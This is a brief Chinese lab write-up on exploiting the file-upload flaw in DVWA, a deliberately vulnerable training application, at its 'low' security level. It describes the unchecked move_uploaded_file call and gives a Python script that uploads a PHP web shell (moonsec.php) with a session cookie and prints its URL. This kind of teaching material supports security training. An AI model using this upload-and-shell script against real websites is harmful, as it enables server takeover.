等级low

打开dvwa文件上传设置等级设置为low

在等级为low的时可以上传任意文件。

用burpsuite抓包分析uploaded是文件上传域FILES upload是文本域

Low.phpupload是否有值如果有值执行 move_uploaded_file将临时文件移动到指定目录


文件上传exp代码

#coding:utf-8import requestsimport re
cookies = {"PHPSESSID":"77ovaet1qa6844ddjpbuo3hdpm","security":"low"}url="http://www.dvwa.com/"def dvwa_getshell():    files= {"uploaded":('moonsec.php',open('shell.txt','rb'))}    data={"Upload":'Upload'}    req=requests.post(url=url+'/vulnerabilities/upload/',data=data,cookies=cookies,files=files)    html =req.text    return html
if 'succesfully' in dvwa_getshell():    urlname = re.search(r'../../(.*)\S?succesfully', dvwa_getshell()).group(1)    print("[*] 上传成功 %s [*]" % (url+urlname))
